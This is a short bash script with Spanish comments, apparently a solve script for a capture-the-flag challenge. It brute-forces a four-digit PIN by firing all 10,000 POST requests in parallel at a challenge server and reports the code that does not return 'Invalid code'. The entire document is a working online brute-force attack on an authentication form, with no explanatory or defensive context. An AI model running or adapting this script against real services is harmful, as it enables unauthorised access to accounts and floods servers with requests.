#!/bin/bash

URL="http://challs.latam-ctf.cybersecnatlab.it:1341/"

check_pin() {
    local pin=$1
    local response=$(curl -s -X POST -d "pincode=${pin}" "${URL}" | html2text)
    if [[ $response == *"Invalid code"* ]]; then
        echo "Descartada: pincode=${pin}"

    else
        echo "Código válido encontrado: pincode=${pin} con response: ${response}"
        exit
    fi
}

# Lanzar solicitudes en paralelo
for pin in {0000..9999}; do
    check_pin $pin &
done

# Esperar a que todos los hilos terminen
wait

